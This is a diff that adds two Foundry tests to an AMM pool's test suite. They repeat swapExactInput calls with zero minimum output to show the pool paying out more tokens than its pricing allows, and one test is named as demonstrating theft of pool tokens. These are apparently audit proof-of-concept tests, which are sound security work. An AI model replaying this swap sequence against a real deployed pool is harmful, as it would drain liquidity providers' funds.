@@ -136,4 +136,69 @@ function testSellPoolTokensReturnsPoolTokens() external {
     vm.stopPrank();
 }
 
+
+function testSwapBreaksContractProtocol() external{
+
+    vm.startPrank(liquidityProvider);
+    weth.approve(address(pool), type(uint256).max);
+    poolToken.approve(address(pool), type(uint256).max);
+    pool.deposit(100e18, 10e18, 100e18, uint64(block.timestamp));
+    vm.stopPrank();
+
+    vm.startPrank(user);
+    uint256 startingUserPoolTokenBalance = poolToken.balanceOf(address(user));
+    weth.approve(address(pool),type(uint64).max);
+    uint256 wethInputReserves = weth.balanceOf(address(pool));
+    uint256 poolTokenOutputReserves = poolToken.balanceOf(address(pool));
+    uint256 oneOutputPoolTokenAmount = pool.getOutputAmountBasedOnInput(1e18, wethInputReserves, poolTokenOutputReserves);
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e18, poolToken, 0, uint64(block.timestamp));
+    uint256 endingUserBalance = poolToken.balanceOf(address(user));
+    uint256 expectedUserPoolTokenBalance = startingUserPoolTokenBalance + (oneOutputPoolTokenAmount * 11) ;
+    assert(endingUserBalance > expectedUserPoolTokenBalance);
+    vm.stopPrank();
+}
+
+
+function testContractTokensGetsStolen() public {
+    vm.startPrank(liquidityProvider);
+    weth.approve(address(pool), type(uint256).max);
+    poolToken.approve(address(pool), type(uint256).max);
+    pool.deposit(2e18, 2e18, 2e18, uint64(block.timestamp));
+    vm.stopPrank();
+    uint256 startingPoolToken = poolToken.balanceOf(address(pool));
+    vm.startPrank(user);
+    weth.approve(address(pool), type(uint256).max);
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    pool.swapExactInput(weth, 1e8, poolToken, 0, uint64(block.timestamp));
+    vm.stopPrank();
+    uint256 endingPoolToken = poolToken.balanceOf(address(pool));
+    uint256 endingWeth = weth.balanceOf(address(pool));
+    console.log("startingPoolToken",startingPoolToken);
+    console.log("endingPoolToken",endingPoolToken);
+    console.log("endingWeth",endingWeth);
+
+}
+
+
+
+
 }
